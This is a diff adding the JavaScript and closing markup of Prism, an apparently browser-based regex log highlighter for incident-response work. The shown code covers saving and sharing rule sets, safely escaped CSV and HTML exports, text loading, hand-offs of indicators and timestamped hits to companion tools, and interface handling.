+    h += '<button type="button" data-sets="import-add">Add rules from a file…</button>';
+    h += '<div class="menu-sep"></div>';
+    h += '<button type="button" data-sets="starter">Add the starter DFIR rules</button>';
+    h += '<button type="button" data-sets="all-on">Turn all rules on</button>';
+    h += '<button type="button" data-sets="all-off">Turn all rules off</button>';
+    h += '<button type="button" data-sets="new" class="danger">Start a new empty set</button>';
+    $('setsList').innerHTML = h;
+  }
+  function saveSet(name) {
+    const sets = getSets();
+    sets[name] = { rules: S.rules.map(ruleExport), saved: new Date().toISOString() };
+    if (!store.set('prism.sets', sets)) { toast('Could not save. Browser storage is full or blocked.'); return; }
+    S.set = name; S.setDirty = false; saveRules(false);
+    toast(`Saved set “${name}”`);
+  }
+  function confirmDiscard() {
+    return !(S.set && S.setDirty) || confirm(`“${S.set}” has unsaved changes. Discard them?`);
+  }
+  $('setsList').addEventListener('click', (e) => {
+    const t = e.target.closest('button'); if (!t) return;
+    closeMenus();
+    if (t.dataset.setLoad != null) {
+      const n = t.dataset.setLoad, s = getSets()[n];
+      if (!s || !confirmDiscard()) return;
+      setRules(s.rules, n); toast(`Loaded “${n}”`);
+    } else if (t.dataset.setDel != null) {
+      const n = t.dataset.setDel, sets = getSets(), s = sets[n];
+      if (!s) return;
+      delete sets[n]; store.set('prism.sets', sets);
+      if (S.set === n) { S.set = null; S.setDirty = false; saveRules(false); }
+      toast(`Deleted set “${n}”`, { label: 'Undo', fn: () => { const x = getSets(); x[n] = s; store.set('prism.sets', x); } });
+    } else {
+      const a = t.dataset.sets;
+      if (a === 'save') saveSet(S.set);
+      else if (a === 'saveas') {
+        const n = (prompt('Name this rule set', S.set ? S.set + ' copy' : 'My rules') || '').trim();
+        if (!n) return;
+        if (getSets()[n] && n !== S.set && !confirm(`A set named “${n}” exists. Replace it?`)) return;
+        saveSet(n);
+      }
+      else if (a === 'export') exportRules();
+      else if (a === 'link') copyRulesLink();
+      else if (a === 'import-replace' || a === 'import-add') { $('rulesIn').dataset.mode = a; $('rulesIn').click(); }
+      else if (a === 'starter') {
+        const have = new Set(S.rules.map((r) => r.pattern + '/' + r.flags));
+        const add = STARTER.filter((r) => !have.has(r.pattern + '/' + r.flags));
+        if (!add.length) { toast('The starter rules are already here'); return; }
+        add.map(normRule).forEach((r) => { validate(r); S.rules.push(r); }); afterStructure();
+        toast(`Added ${add.length} starter rules`);
+      }
+      else if (a === 'all-on' || a === 'all-off') { S.rules.forEach((r) => (r.on = a === 'all-on')); afterStructure(); }
+      else if (a === 'new') {
+        if (!confirmDiscard()) return;
+        const prev = S.rules.map(ruleExport), prevSet = S.set;
+        setRules([], null);
+        toast('Started a new empty set', { label: 'Undo', fn: () => setRules(prev, prevSet) });
+      }
+    }
+  });
+  function exportRules() {
+    if (!S.rules.length) { toast('No rules to save'); return; }
+    const name = S.set || 'prism-rules';
+    download(JSON.stringify({ app: 'prism', version: 1, name, saved: new Date().toISOString(), rules: S.rules.map(ruleExport) }, null, 2),
+      slug(name) + '.prism.json', 'application/json');
+  }
+  $('rulesIn').addEventListener('change', async (e) => {
+    const f = e.target.files[0], mode = e.target.dataset.mode; e.target.value = '';
+    if (!f) return;
+    let data;
+    try { data = JSON.parse(await f.text()); } catch (err) { toast('That file is not valid JSON'); return; }
+    const list = Array.isArray(data) ? data : Array.isArray(data.rules) ? data.rules : null;
+    if (!list || !list.every((r) => r && typeof r.pattern === 'string')) { toast('No rules found in that file'); return; }
+    const name = (!Array.isArray(data) && data.name) || f.name.replace(/(\.prism)?\.json$/i, '');
+    if (mode === 'import-replace') {
+      if (!confirmDiscard()) return;
+      setRules(list, null);
+      S.set = null; renderSetName();
+      toast(`Loaded ${list.length} rules from ${f.name}`, { label: 'Save as a set', fn: () => saveSet(uniqueSetName(name)) });
+    } else {
+      list.map(normRule).forEach((r) => { validate(r); S.rules.push(r); }); afterStructure();
+      toast(`Added ${list.length} rules from ${f.name}`);
+    }
+  });
+  function uniqueSetName(n) { const s = getSets(); let x = n, i = 2; while (s[x]) x = `${n} (${i++})`; return x; }
+
+  // ---------- Status ----------
+  function renderStatus() {
+    const n = lineCount();
+    if (S.sizeVer !== S.textVer) { S.sizeVer = S.textVer; S.size = S.text.length > 20e6 ? S.text.length : new Blob([S.text]).size; }
+    $('stText').textContent = S.text ? `${fmtN(n)} lines · ${fmtBytes(S.size)}${S.viewLines ? ` · showing ${fmtN(S.viewLines.length)} lines with hits` : ''}` : 'No text';
+    const active = S.rules.filter((r) => r.on && r.count).length;
+    $('stHits').textContent = S.text ? `${fmtN(S.hits.length)} hits from ${active} rule${active === 1 ? '' : 's'}` : '';
+    const st = $('stTime');
+    if (S.running) { st.textContent = 'Matching…'; st.className = 'busy'; }
+    else { st.textContent = S.text && S.hits.length ? `matched in ${Math.round(S.lastMs)} ms` : ''; st.className = ''; }
+  }
+
+  // ---------- Exports ----------
+  function slug(s) { return String(s).toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '') || 'prism'; }
+  function download(content, name, type) {
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(new Blob([content], { type }));
+    a.download = name; document.body.appendChild(a); a.click(); a.remove();
+    setTimeout(() => URL.revokeObjectURL(a.href), 4000);
+  }
+  function csvCell(v) {
+    let s = String(v ?? '');
+    if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+    return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
+  }
+  function hitRows(safe) {
+    const cell = safe ? csvCell : csvPlain;
+    const rows = [['rule', 'match', 'line', 'column', 'offset', 'length', 'context']];
+    for (const h of S.order) {
+      const hit = S.hits[h], r = S.ruleById.get(hit.rid), L = lineOf(hit.s);
+      const a = Math.max(0, hit.s - 60), b = Math.min(S.text.length, hit.e + 60);
+      rows.push([r ? r.name : '', S.text.slice(hit.s, hit.e), L + 1, hit.s - S.starts[L] + 1, hit.s, hit.e - hit.s, S.text.slice(a, b).replace(/\r?\n/g, ' ⏎ ')]);
+    }
+    return rows.map((r) => r.map(cell).join(',')).join('\r\n') + '\r\n';
+  }
+  function csvPlain(v) { const s = String(v ?? ''); return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s; }
+  function exportCsv() {
+    if (!S.hits.length) { toast('No hits to export'); return; }
+    download('\ufeff' + hitRows(true), 'prism-hits.csv', 'text/csv');
+  }
+
+  // ---------- Hand-offs to the other jon.glass tools (see /assets/suite/handoff.js) ----------
+  function handoff(to, env, toolName) {
+    if (!window.Suite || !Suite.available()) { toast(`This copy of Prism can't hand off to ${toolName}. Export the hits as CSV and open them there.`); return; }
+    const w = window.open('', '_blank');
+    const go = (url) => { if (w) { w.opener = null; w.location.href = url; } else location.href = url; };
+    Suite.send('prism', to, env).then(go, (e) => { if (w) w.close(); toast(e.message); });
+  }
+  const refang = (v) => v.replace(/\[\.\]/g, '.').replace(/\[:\]/g, ':').replace(/^hxxp/i, 'http');
+  const PRIVATE_IP = /^(?:10\.|127\.|0\.|169\.254\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)\d{1,3}\.\d{1,3}(?:\.\d{1,3})?$/;
+  function sendTessera() {
+    const seen = new Map(), skipped = new Set();
+    for (const h of S.order) {
+      const hit = S.hits[h], r = S.ruleById.get(hit.rid);
+      if (!r || !r.ioc) continue;
+      const v = refang(S.text.slice(hit.s, hit.e).trim());
+      if (!v || v.length > 2000) continue;
+      if (PRIVATE_IP.test(v)) { skipped.add(v); continue; }
+      const k = v.toLowerCase();
+      if (!seen.has(k)) seen.set(k, { type: '', value: v, note: `${r.name}, line ${lineOf(hit.s) + 1}`, source: 'Prism' });
+    }
+    if (!seen.size) { toast(skipped.size ? 'Only internal addresses matched, and those stay out of Tessera' : 'No indicator hits. Mark rules as indicators in their settings.'); return; }
+    if (skipped.size) toast(`Left out ${fmtN(skipped.size)} internal address${skipped.size === 1 ? '' : 'es'}`);
+    handoff('tessera', { kind: 'case', name: 'Prism indicators', data: JSON.stringify({ indicators: [...seen.values()] }) }, 'Tessera');
+  }
+  const TS_RE = /\b(\d{4}-\d{2}-\d{2})[T ](\d{2}:\d{2}:\d{2}(?:[.,]\d+)?)(Z|[+-]\d{2}:?\d{2})?/;
+  function lineTime(L) {
+    const m = TS_RE.exec(S.text.slice(S.starts[L], Math.min(lineEnd(L), S.starts[L] + 4000)));
+    if (!m) return null;
+    const d = new Date(`${m[1]}T${m[2].replace(',', '.')}${m[3] ? (m[3] === 'Z' ? 'Z' : m[3].replace(/^([+-]\d{2})(\d{2})$/, '$1:$2')) : 'Z'}`);
+    return isNaN(d) ? null : d.toISOString();
+  }
+  function sendRecap() {
+    const rows = [['time_utc', 'rule', 'match', 'line', 'context'].join(',')];
+    const cache = new Map();
+    for (const h of S.order) {
+      const hit = S.hits[h], r = S.ruleById.get(hit.rid), L = lineOf(hit.s);
+      if (!cache.has(L)) cache.set(L, lineTime(L));
+      const t = cache.get(L); if (!t) continue;
+      rows.push([t, r ? r.name : '', S.text.slice(hit.s, hit.e), L + 1, S.text.slice(S.starts[L], Math.min(lineEnd(L), S.starts[L] + 400))].map(csvPlain).join(','));
+    }
+    if (rows.length < 2) { toast('None of the hits are on a line with a timestamp Prism can read'); return; }
+    handoff('recap', { kind: 'events', name: 'prism-hits', data: rows.join('\n') + '\n', meta: { timeCols: ['time_utc'], tz: 0 } }, 'Recap');
+  }
+  function sendShifu() {
+    if (!S.hits.length) { toast('No hits to send'); return; }
+    handoff('shifu', { kind: 'table', name: 'prism-hits', data: hitRows(false) }, 'Shifu');
+  }
+
+  // ---------- Rules in a link: #rules=<deflate-raw, base64url> ----------
+  const b64u = (u8) => { let s = ''; for (let i = 0; i < u8.length; i += 0x8000) s += String.fromCharCode.apply(null, u8.subarray(i, i + 0x8000)); return btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); };
+  const unb64u = (s) => Uint8Array.from(atob(s.replace(/-/g, '+').replace(/_/g, '/')), (c) => c.charCodeAt(0));
+  async function pipe(u8, stream) { return new Uint8Array(await new Response(new Blob([u8]).stream().pipeThrough(stream)).arrayBuffer()); }
+  async function rulesHash() {
+    const json = new TextEncoder().encode(JSON.stringify({ name: S.set || '', rules: S.rules.map(ruleExport) }));
+    if (typeof CompressionStream !== 'undefined') return 'z' + b64u(await pipe(json, new CompressionStream('deflate-raw')));
+    return 'j' + b64u(json);
+  }
+  async function copyRulesLink() {
+    if (!S.rules.length) { toast('No rules to share'); return; }
+    const base = /^https?:$/.test(location.protocol) ? location.origin + location.pathname : 'https://jon.glass/prism/';
+    const url = base + '#rules=' + (await rulesHash());
+    copy(url, `Link copied (${fmtN(url.length)} characters). It holds the rules, not your text.`);
+  }
+  async function rulesFromHash() {
+    const m = /(?:^#|&)rules=([zj])([A-Za-z0-9_-]+)/.exec(location.hash);
+    if (!m) return false;
+    try {
+      let u8 = unb64u(m[2]);
+      if (m[1] === 'z') u8 = await pipe(u8, new DecompressionStream('deflate-raw'));
+      const d = JSON.parse(new TextDecoder().decode(u8));
+      if (!Array.isArray(d.rules) || !d.rules.every((r) => r && typeof r.pattern === 'string')) throw new Error('no rules');
+      const name = String(d.name || '').slice(0, 80);
+      let kept = '';
+      if (S.rules.length && (!S.set || S.setDirty) && JSON.stringify(S.rules.map(ruleExport)) !== JSON.stringify(d.rules.map(normRule).map(ruleExport))) {
+        kept = uniqueSetName('Rules before ' + new Date().toLocaleString());
+        const sets = getSets(); sets[kept] = { rules: S.rules.map(ruleExport), saved: new Date().toISOString() }; store.set('prism.sets', sets);
+      }
+      setRules(d.rules, null);
+      toast(`Loaded ${d.rules.length} rules from the link${name ? ` (“${name}”)` : ''}.${kept ? ` Your previous rules are in Sets as “${kept}”.` : ''}`, { label: 'Save as a set', fn: () => saveSet(uniqueSetName(name || 'Shared rules')) });
+      history.replaceState(null, '', location.pathname + location.search);
+      return true;
+    } catch (e) { toast('The rules in that link could not be read'); return false; }
+  }
+
+  // ---------- Text from links and other tools: ?src=, ?sample=1, ?from= ----------
+  async function loadFromUrl() {
+    const q = new URLSearchParams(location.search);
+    if (q.get('from')) {
+      try {
+        if (!window.Suite) throw new Error('this copy of Prism cannot read hand-offs');
+        const h = await Suite.receive('prism', q.get('from'));
+        replaceText(h.text(), `Received ${h.name} from ${h.fromName}`);
+      } catch (e) { toast(`Could not load from ${String(q.get('from')).slice(0, 40)}: ${e.message}`); }
+      history.replaceState(null, '', location.pathname + location.hash);
+      return;
+    }
+    if (q.get('sample')) { replaceText(SAMPLE, 'Loaded the sample log'); return; }
+    const srcs = q.getAll('src').slice(0, 10);
+    if (!srcs.length) return;
+    const parts = [];
+    for (const s of srcs) {
+      let u;
+      try { u = new URL(s, location.href); } catch (e) { toast(`"${s.slice(0, 80)}" is not a valid link`); continue; }
+      if (u.protocol !== 'https:' && u.origin !== location.origin) { toast(`Prism only loads https:// links (got ${u.protocol})`); continue; }
+      try {
+        const r = await fetch(u.href, { credentials: 'omit' });
+        if (!r.ok) throw new Error('HTTP ' + r.status);
+        parts.push([decodeURIComponent(u.pathname.split('/').pop() || u.host), await r.text()]);
+      } catch (e) { toast(`Could not load ${u.pathname.split('/').pop() || u.href}: ${e.message}`); }
+    }
+    if (!parts.length) return;
+    replaceText(parts.length === 1 ? parts[0][1] : parts.map(([n, t]) => `==> ${n} <==\n${t}`).join('\n'),
+      parts.length === 1 ? `Loaded ${parts[0][0]}` : `Loaded ${parts.length} files`);
+  }
+  function exportHtml() {
+    if (!S.text) { toast('No text to export'); return; }
+    const only = S.viewLines;
+    let body = '';
+    const n = only ? only.length : lineCount();
+    for (let p = 0; p < n; p++) body += lineHtml(only ? only[p] : p, true);
+    const legend = S.rules.filter((r) => r.on && r.count).map((r) => `<span class="lg"><span class="h r-${r.id}">${esc(r.name)}</span> ${fmtN(r.count)}</span>`).join('');
+    const doc = `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Prism export</title><style>
+body{margin:0;background:#0e131b;color:#e6ebf2;font:12.5px/18px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+header{position:sticky;top:0;z-index:2;background:#141a24;border-bottom:1px solid #2a3546;padding:8px 12px;font-family:system-ui,sans-serif;font-size:13px;display:flex;gap:14px;flex-wrap:wrap}
+.lg{white-space:nowrap}.ln{display:flex}.no{flex:none;min-width:${String(lineCount()).length + 1}ch;padding-right:10px;text-align:right;color:#8b97a8;border-right:1px solid #2a3546;user-select:none}
+.tx{white-space:pre-wrap;word-break:break-all;padding:0 10px}.h{border-radius:2px}.h.multi{text-decoration:overline dotted}
+${$('ruleStyles').textContent}
+</style></head><body><header><b>Prism</b><span>${fmtN(S.hits.length)} hits · exported ${new Date().toISOString()}</span>${legend}</header>${body}</body></html>`;
+    download(doc, 'prism-highlighted.html', 'text/html');
+  }
+
+  // ---------- Text input ----------
+  async function loadFiles(files) {
+    files = Array.from(files || []); if (!files.length) return;
+    try {
+      const texts = await Promise.all(files.map((f) => f.text()));
+      const t = files.length === 1 ? texts[0] : texts.map((x, i) => `==> ${files[i].name} <==\n${x}`).join('\n');
+      replaceText(t, files.length === 1 ? `Loaded ${files[0].name}` : `Loaded ${files.length} files`);
+    } catch (e) { toast('Could not read that file'); }
+  }
+  $('fileIn').addEventListener('change', (e) => { loadFiles(e.target.files); e.target.value = ''; });
+  document.addEventListener('paste', (e) => {
+    const t = e.target;
+    if (t && t.closest && t.closest('input, textarea, select, [contenteditable]')) return;
+    const s = e.clipboardData && e.clipboardData.getData('text');
+    if (!s) return;
+    e.preventDefault();
+    replaceText(s, 'Pasted ' + fmtN(s.length) + ' characters');
+  });
+  let dragDepth = 0;
+  const hasFiles = (e) => e.dataTransfer && Array.from(e.dataTransfer.types || []).includes('Files');
+  document.addEventListener('dragenter', (e) => { if (!hasFiles(e)) return; dragDepth++; document.body.classList.add('dragging'); });
+  document.addEventListener('dragleave', (e) => { if (!hasFiles(e)) return; if (--dragDepth <= 0) { dragDepth = 0; document.body.classList.remove('dragging'); } });
+  document.addEventListener('dragover', (e) => { if (hasFiles(e)) e.preventDefault(); });
+  document.addEventListener('drop', (e) => {
+    if (!hasFiles(e)) return;
+    e.preventDefault(); dragDepth = 0; document.body.classList.remove('dragging');
+    loadFiles(e.dataTransfer.files);
+  });
+
+  function startEdit() {
+    hideTip(true);
+    const ed = $('editor');
+    ed.value = S.text; ed.hidden = false; $('editBar').hidden = false; $('empty').hidden = true; view.hidden = true;
+    ed.focus();
+  }
+  function endEdit(apply) {
+    const ed = $('editor');
+    ed.hidden = true; $('editBar').hidden = true; view.hidden = false;
+    if (apply && ed.value !== S.text) setText(ed.value);
+    else $('empty').hidden = !!S.text;
+    ed.value = '';
+  }
+  $('editDone').addEventListener('click', () => endEdit(true));
+  $('editCancel').addEventListener('click', () => endEdit(false));
+  $('editor').addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' && (e.metaKey || e.ctrlKey)) { e.preventDefault(); endEdit(true); }
+    else if (e.key === 'Escape') { e.preventDefault(); endEdit(false); }
+  });
+
+  function doAction(act) {
+    closeMenus();
+    if (act === 'open') $('fileIn').click();
+    else if (act === 'edit') startEdit();
+    else if (act === 'sample') replaceText(SAMPLE, 'Loaded the sample log');
+    else if (act === 'clear') { if (!S.text) return; const prev = S.text; setText(''); toast('Cleared the text', { label: 'Undo', fn: () => setText(prev) }); }
+    else if (act === 'csv') exportCsv();
+    else if (act === 'html') exportHtml();
+    else if (act === 'rules-export') exportRules();
+    else if (act === 'to-tessera') sendTessera();
+    else if (act === 'to-recap') sendRecap();
+    else if (act === 'to-shifu') sendShifu();
+  }
+  document.addEventListener('click', (e) => {
+    const a = e.target.closest('[data-act]');
+    if (a && !a.closest('#rules') && (a.closest('.menu-list') || a.closest('.empty-card'))) doAction(a.dataset.act);
+  });
+
+  // ---------- Menus, toasts, clipboard ----------
+  function closeMenus(except) { document.querySelectorAll('.menu.open').forEach((m) => { if (m !== except) m.classList.remove('open'); }); }
+  document.addEventListener('click', (e) => {
+    const b = e.target.closest('[data-menu]');
+    if (b) {
+      const m = b.closest('.menu');
+      if (m.id === 'setsMenu' && !m.classList.contains('open')) renderSetsMenu();
+      closeMenus(m); m.classList.toggle('open'); return;
+    }
+    if (!e.target.closest('.menu-list')) closeMenus();
+  });
+  function toast(msg, action) {
+    const el = document.createElement('div');
+    el.className = 'toast';
+    el.innerHTML = `<span>${esc(msg)}</span>`;
+    if (action) {
+      const b = document.createElement('button'); b.textContent = action.label;
+      b.onclick = () => { action.fn(); el.remove(); };
+      el.appendChild(b);
+    }
+    $('toasts').appendChild(el);
+    setTimeout(() => el.remove(), action ? 7000 : 3500);
+  }
+  async function copy(text, msg) {
+    try { await navigator.clipboard.writeText(text); }
+    catch (e) {
+      const ta = document.createElement('textarea'); ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+      document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove();
+    }
+    toast(msg);
+  }
+
+  // ---------- Options, keys, layout ----------
+  function saveView() { store.set('prism.view', { wrap: $('optWrap').checked, only: $('optOnly').checked, ctx: $('optCtx').value, side: parseInt(getComputedStyle(document.documentElement).getPropertyValue('--side')) || 360, left: $('layout').classList.contains('left') }); }
+  function setSide(left) {
+    $('layout').classList.toggle('left', left);
+    $('sideIcon').setAttribute('x', left ? '2.5' : '9.5');
+  }
+  $('sideBtn').addEventListener('click', () => {
+    const top = topLine(); hideTip(true);
+    setSide(!$('layout').classList.contains('left')); saveView();
+    if (view.classList.contains('wrap')) rebuildView(top);
+  });
+  $('optWrap').addEventListener('change', (e) => { const top = topLine(); view.classList.toggle('wrap', e.target.checked); rebuildView(top); saveView(); });
+  $('optOnly').addEventListener('change', () => { const top = topLine(); computeViewLines(); hideTip(true); rebuildView(top); renderStatus(); saveView(); });
+  $('optCtx').addEventListener('change', () => { saveView(); if (S.pinned && S.tipAnchor && S.tipAnchor.isConnected) showTip(+S.tipAnchor.dataset.k, S.tipAnchor, true, S.curHit >= 0 ? S.curHit : undefined); });
+  $('nextHit').addEventListener('click', () => stepHit(S.order, 1));
+  $('prevHit').addEventListener('click', () => stepHit(S.order, -1));
+
+  document.addEventListener('keydown', (e) => {
+    const t = e.target;
+    if (t && t.closest && t.closest('input, textarea, select, [contenteditable]')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey) return;
+    if (e.key === 'Escape') { hideTip(true); closeMenus(); }
+    else if (e.key === 'n' || e.key === 'N') { e.preventDefault(); stepHit(S.order, e.shiftKey ? -1 : 1); }
+    else if (e.key === 'p') { e.preventDefault(); stepHit(S.order, -1); }
+  });
+
+  const split = $('split');
+  split.addEventListener('mousedown', (e) => {
+    e.preventDefault(); split.classList.add('drag');
+    const move = (ev) => {
+      const raw = $('layout').classList.contains('left') ? ev.clientX : innerWidth - ev.clientX;
+      const w = Math.min(Math.max(260, raw), Math.max(300, innerWidth - 320));
+      document.documentElement.style.setProperty('--side', w + 'px');
+    };
+    const up = () => {
+      split.classList.remove('drag'); removeEventListener('mousemove', move); removeEventListener('mouseup', up);
+      saveView(); if (view.classList.contains('wrap')) rebuildView(topLine());
+    };
+    addEventListener('mousemove', move); addEventListener('mouseup', up);
+  });
+  let resizeT = null;
+  addEventListener('resize', () => {
+    hideTip(true);
+    clearTimeout(resizeT);
+    resizeT = setTimeout(() => { if (view.classList.contains('wrap')) rebuildView(topLine()); }, 200);
+  });
+
+  $('themeBtn').addEventListener('click', () => {
+    const t = document.documentElement.dataset.theme === 'light' ? 'dark' : 'light';
+    document.documentElement.dataset.theme = t; store.set('prism.theme', t);
+  });
+
+  // ---------- Start ----------
+  function init() {
+    const theme = store.get('prism.theme', null) || (matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark');
+    document.documentElement.dataset.theme = theme;
+    $('pasteKey').textContent = isMac ? '⌘' : 'Ctrl';
+    const v = store.get('prism.view', {});
+    $('optWrap').checked = !!v.wrap; view.classList.toggle('wrap', !!v.wrap);
+    $('optOnly').checked = !!v.only;
+    if (v.ctx && $('optCtx').querySelector(`option[value="${v.ctx}"]`)) $('optCtx').value = v.ctx; else $('optCtx').value = 'c100';
+    setSide(v.left !== false);
+    if (v.side) document.documentElement.style.setProperty('--side', Math.max(260, v.side) + 'px');
+
+    const saved = store.get('prism.rules', null);
+    const cur = store.get('prism.current', {});
+    S.rules = (Array.isArray(saved) ? saved : STARTER).map(normRule);
+    S.rules.forEach(validate); indexRules();
+    S.set = cur.set && getSets()[cur.set] ? cur.set : null; S.setDirty = !!(S.set && cur.dirty);
+    renderSetName();
+    updateRuleStyles(); renderRules();
+    setText(store.get('prism.text', ''), { quiet: true });
+    rulesFromHash().then(loadFromUrl);
+  }
+  addEventListener('hashchange', () => { rulesFromHash(); });
+  init();
+})();
+</script>
+</body>
+</html>
